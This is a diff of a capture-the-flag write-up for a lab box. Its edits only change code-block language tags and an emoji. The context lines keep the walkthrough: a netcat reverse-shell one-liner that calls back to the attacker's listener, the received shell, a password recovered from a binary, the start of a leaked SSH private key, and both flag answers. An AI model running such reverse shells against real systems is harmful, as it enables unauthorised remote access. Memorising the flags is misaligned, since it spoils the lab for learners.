@@ -139,7 +139,7 @@ Prompting off for duration of mget.
 
 We got a file named note.txt which says this
 
-```go
+```sh
 └─$ cat note.txt
 In case I forget my password, I'm leaving a pointer to the internal shell service on the server.
 
@@ -159,7 +159,7 @@ So we use this one `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.
 And Yeah
 we got the shell...
 
-```python
+```sh
 └─$ nc -nvlp 1337
 listening on [any] 1337 ...
 connect to [192.168.135.240] from (UNKNOWN) [10.48.161.2] 37280
@@ -175,7 +175,7 @@ Here there was one user in `/home` --> `catlover`
 the user has only one file named `runme`
 so we ran it and it asks for a password which is not the one we used earlier so I `cat` it to see if I can find anything useful and yeah this is what I found
 
-```c
+```plain
  %(tOHHHEHRHHHHEHHEHHH(H]UHH}u}u2}u)H=-EH6+H5-H+HUH]UHH H}HuHUH}uHUHMHEHHUHATSHH}HuHEHHHEHH9uCHEHIHEHJHHEH;LHHQuH[A\]@AWL=+'AVIAUIATAUH$'SL)Ht1LLDAHH9u[]A\A]A^A_ff.rebeccaPlease enter yout password: Welcome, catlover! SSH key transfer queued! touch /tmp/gibmethesshkeyAccess Deniedd
 ```
 
@@ -191,7 +191,7 @@ runme
 I have no name!@cat-pictures:/home/catlover#
 ```
 
-Yup! got the `ssh` key :)
+Yup! got the `ssh` key 😁
 
 ```ssh
 -----BEGIN RSA PRIVATE KEY-----
@@ -264,7 +264,7 @@ root@7546fa2336d6:/#
 
 Flag1: flag.txt
 
-```python
+```sh
 root@7546fa2336d6:/root# cat flag.txt
 7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9
 ```
@@ -342,7 +342,7 @@ root@cat-pictures:~#
 
 Thus we got both the flags as
 
-```c
-Flag1: `7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9`
-Flag2: `4a98e43d78bab283938a06f38d2ca3a3c53f0476`
+```sh
+Flag1: 7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9
+Flag2: 4a98e43d78bab283938a06f38d2ca3a3c53f0476
 ```
